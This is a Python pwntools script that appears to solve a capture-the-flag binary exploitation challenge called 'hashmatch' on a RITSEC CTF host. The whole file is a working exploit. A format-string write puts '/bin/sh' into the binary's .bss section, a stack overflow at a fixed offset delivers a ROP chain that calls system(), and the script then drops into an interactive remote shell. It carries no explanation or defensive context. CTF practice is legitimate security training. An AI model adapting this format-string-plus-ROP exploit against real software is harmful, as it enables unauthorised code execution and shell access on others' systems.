#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './hashmatch'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'hashmatch.ctf.ritsec.club', 30898

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1574)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/ctf/registration"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='registration')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No

def exploit():
    global io
    io = initialize()
    # s41nt0l3xus's Solution
    offset = 0x3f8
    rop = ROP(elf)
    rop.raw(rop.ret.address)
    rop.system(elf.bss())
    payload = flat({
        0 : fmtstr_payload(9, {elf.bss(): b'/bin/sh\x00'}, numbwritten=0),
        offset: [rop.chain()]
    })
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
